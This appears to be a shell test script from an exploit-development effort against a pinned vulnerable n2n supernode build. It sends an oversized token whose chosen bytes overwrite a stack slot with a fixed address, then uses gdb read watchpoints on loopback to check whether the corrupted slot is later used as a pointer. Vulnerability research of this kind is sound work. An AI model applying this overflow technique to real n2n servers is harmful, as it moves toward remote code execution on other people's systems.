#!/bin/sh
# W13 one-command replay: on the exact W11 non-PIE clang -O2 pinned
# vulnerable supernode, determine whether the W9 `sss` spill slot
# (&nak+1672) is consumed as a pointer after decode returns.
#
# Attack wire: token_size=1700, with 8 chosen bytes at token+1682
# (= nak+1696, the comm spill slot) set to the fixed .bss address
# 0x42f3e8. comm is therefore valid and the run survives past the
# sn_utils.c:2324 dereference seen in W10.
#
# Case "watch": break after decode (:2331), confirm the sss slot holds
# chosen garbage and comm holds the chosen fixed address, arm a hardware
# READ watchpoint on the sss slot, continue to process_udp return. No
# "Value =" line means the supernode never read that slot.
# Case "control": safe token_size=48 with a registered peer; a read
# watchpoint on nak+14 must fire in the W3 forwarding encoder. This is a
# real program read: gdb's own `p` uses ptrace and cannot trip a hardware
# watchpoint. It proves read watchpoints work in this build and path.
#
# gdb observes only; it never supplies a pointer value. Loopback only.
set -u
HERE=$(cd "$(dirname "$0")" || exit 1; pwd)
N2N=$(cd "$HERE/.." || exit 1; pwd)
TARBALL=$N2N/provision/n2n-vuln.tar.gz
SENDER=$HERE/w10_large_peer.py
EVID=$HERE/evidence
WORK=${TMPDIR:-/tmp}/n2n2shell-w13-replay.$$
BASE=${PORT_BASE:-19200}
TARGET=0x42f3e8
PASS=0
FAIL=0
mkdir -p "$WORK/src" || exit 1
trap 'rm -rf "$WORK"' EXIT HUP INT TERM

check() {
    if [ "$2" -eq 0 ]; then PASS=$((PASS+1)); echo "PASS $1";
    else FAIL=$((FAIL+1)); echo "FAIL $1"; fi
}

tar xzf "$TARBALL" -C "$WORK/src" || exit 1
SRC=$WORK/src/n2n-dc7324af16b2ff3e2b22961e7d8dffcb14f3f6ff
(cd "$SRC" && sh autogen.sh &&
    CC=clang CFLAGS="-g -O2 -fno-omit-frame-pointer -no-pie" \
    LDFLAGS="-no-pie" ./configure &&
    make -j4 supernode) >"$EVID/w13-build.log" 2>&1
check 01-non-pie-clang-o2-build "$?"
[ -x "$SRC/supernode" ] || { echo "RESULT $PASS PASS / $FAIL FAIL"; exit 1; }
nm -n "$SRC/supernode" | grep -q ' b previously_issued_time_stamp$'
check 02-fixed-bss-symbol "$?"

# label port token_size override watch_expression
gdb_case() {
    label=$1 port=$2 size=$3 override=$4 watch=$5
    cmd=$WORK/gdb-$label.txt
    cat >"$cmd" <<EOF
set pagination off
set confirm off
set disable-randomization on
break sn_utils.c:2331
run -f -p 127.0.0.1:$port -t $((port+1)) -c community.list -F labfed -M
printf "W13_POST_DECODE\n"
p &nak
printf "W13_SLOT_1672_RAW\n"
x/gx (char *)&nak+1672
printf "W13_SLOT_1696_RAW\n"
x/gx (char *)&nak+1696
rwatch *(void **)($watch)
printf "W13_WATCH_ARMED\n"
continue
printf "W13_AFTER_CONTINUE\n"
bt 4
printf "W13_DONE\n"
kill
quit
EOF
    (cd "$SRC" && timeout 45 gdb -q -batch -x "$cmd" ./supernode) \
        >"$EVID/w13-$label.log" 2>&1 &
    gp=$!
    sleep 5
    if [ -n "$override" ]; then
        python3 "$SENDER" "$port" "$((port+10))" "$size" "$override" \
            >"$EVID/w13-$label-sender.log" 2>&1
    else
        python3 "$SENDER" "$port" "$((port+10))" "$size" \
            >"$EVID/w13-$label-sender.log" 2>&1
    fi
    wait "$gp" 2>/dev/null || true
}

# A: real program — no read of the overwritten sss slot after decode.
gdb_case watch "$BASE" 1700 "1682:$TARGET" '(char *)&nak+1672'
grep -q 'W13_POST_DECODE' "$EVID/w13-watch.log"
check 03-post-decode-breakpoint "$?"
grep -q '0x7fffffff.*:.*0x5a48494d5a48494d' "$EVID/w13-watch.log"
check 04-sss-slot-is-chosen-garbage "$?"
grep -q '0x000000000042f3e8' "$EVID/w13-watch.log"
check 05-comm-slot-is-chosen-address "$?"
grep -q 'W13_WATCH_ARMED' "$EVID/w13-watch.log"
check 06-read-watch-armed "$?"
if grep -q '^Value = ' "$EVID/w13-watch.log"; then
    check 07-no-program-read-of-sss-slot 1
else
    check 07-no-program-read-of-sss-slot 0
fi
grep -q 'run_sn_loop' "$EVID/w13-watch.log"
check 08-process_udp-returned "$?"
grep -q 'W13_DONE' "$EVID/w13-watch.log"
check 09-watch-case-completed "$?"

# B: control — the forwarding encoder really reads nak+14; the same
# kind of hardware read watchpoint must fire there. GDB stops on the
# hit, so no forwarded datagram is expected in this case.
gdb_case control "$((BASE+20))" 48 "" '(char *)&nak+14'
grep -q '0x494d5a48494d5a48' "$EVID/w13-control.log"
check 10-control-watched-chosen-wire-bytes "$?"
grep -q '^Value = ' "$EVID/w13-control.log"
check 11-control-watchpoint-fired "$?"

echo "RESULT $PASS PASS / $FAIL FAIL"
echo "RAW $EVID/w13-*.log"
[ "$FAIL" -eq 0 ]
